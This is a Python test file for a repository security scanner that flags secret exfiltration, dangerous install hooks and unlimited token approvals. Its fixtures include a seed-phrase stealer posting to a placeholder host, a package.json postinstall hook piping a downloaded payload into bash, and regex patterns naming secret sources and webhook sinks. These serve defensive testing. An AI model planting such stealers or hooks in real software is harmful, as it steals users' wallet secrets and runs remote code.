from trust_auditor.scanner import scan_text


def ids(findings):
    return {f.rule_id for f in findings}


def test_secret_to_network_is_critical():
    code = '''
seed_phrase = input("Enter seed phrase: ")
import requests
requests.post("https://example.invalid/collect", json={"seed": seed_phrase})
'''
    findings = scan_text("owner/repo", "stealer.py", code)
    assert "SECRET_TO_NETWORK" in ids(findings)
    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "SECRET_TO_NETWORK")
    assert all("correct horse" not in f.evidence for f in findings)


def test_install_hook_alarm():
    package = '''{
      "name":"x",
      "scripts":{"postinstall":"curl https://example.invalid/payload | bash"}
    }'''
    findings = scan_text("owner/repo", "package.json", package)
    assert "DANGEROUS_INSTALL_HOOK" in ids(findings)
    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "DANGEROUS_INSTALL_HOOK")


def test_unlimited_approval_warns():
    code = 'token.approve(spender, MaxUint256);'
    findings = scan_text("owner/repo", "approve.js", code)
    assert "UNLIMITED_APPROVAL" in ids(findings)


def test_plain_http_client_not_automatically_critical():
    code = 'import requests\nresponse = requests.post("https://api.example.invalid/status", json={"ping": 1})\n'
    findings = scan_text("owner/repo", "client.py", code)
    assert not any(f.severity == "CRITICAL" for f in findings)


def test_secret_values_are_redacted():
    code = 'private_key = "' + ("a" * 64) + '"'
    findings = scan_text("owner/repo", "config.py", code)
    critical = [f for f in findings if f.rule_id == "HARDCODED_EVM_KEY"]
    assert critical
    assert critical[0].evidence == "[REDACTED POTENTIAL SECRET]"



def test_detector_definitions_do_not_self_trigger_exfiltration():
    code = r'''
SENSITIVE_SOURCE = _rx(r"(?:private[_ -]?key|secret[_ -]?key|seed[_ -]?phrase|mnemonic|password|passphrase|api[_ -]?key|auth[_ -]?token|session[_ -]?cookie|document\.cookie|clipboard)")
NETWORK_SINK = _rx(r"(?:requests\.post|axios\.post|fetch\s*\(|http\.post|https\.request|webhook|api\.telegram\.org|discord(?:app)?\.com/api/webhooks)")
'''
    findings = scan_text("owner/repo", "scanner.py", code)
    assert "SECRET_TO_NETWORK" not in ids(findings)
    assert "SENSITIVE_DATA_WITH_NETWORK" not in ids(findings)



def test_unrelated_sensitive_storage_and_network_call_are_not_exfiltration():
    code = """
cache_key = "gta_audit_keys_v3"
localStorage.setItem(cache_key, "recent")
response = requests.get("https://api.github.com/repos/example/project")
"""
    findings = scan_text("owner/repo", "cache.py", code)
    assert "SECRET_TO_NETWORK" not in ids(findings)


def test_scanner_rule_catalog_does_not_trigger_its_own_rules():
    code = r'''
Rule("UNLIMITED_APPROVAL", "HIGH", "wallet-permission", _rx(r"(?:approve|allowance|permit)[^\\n]{0,180}(?:MaxUint256|MAX_UINT)"), "Possible unlimited token approval/permit")
'''
    findings = scan_text("owner/repo", "trust_auditor/scanner.py", code)
    assert "UNLIMITED_APPROVAL" not in ids(findings)


def test_documentation_and_test_fixtures_do_not_score_behavior_examples():
    doc = 'Never enter a seed phrase. Example: requests.post("https://example.invalid", json={"seed": seed_phrase})'
    test = 'seed_phrase = input("Enter seed phrase: ")\\nrequests.post("https://example.invalid", json={"seed": seed_phrase})'
    assert not scan_text("owner/repo", "README.md", doc)
    assert not scan_text("owner/repo", "tests/test_example.py", test)
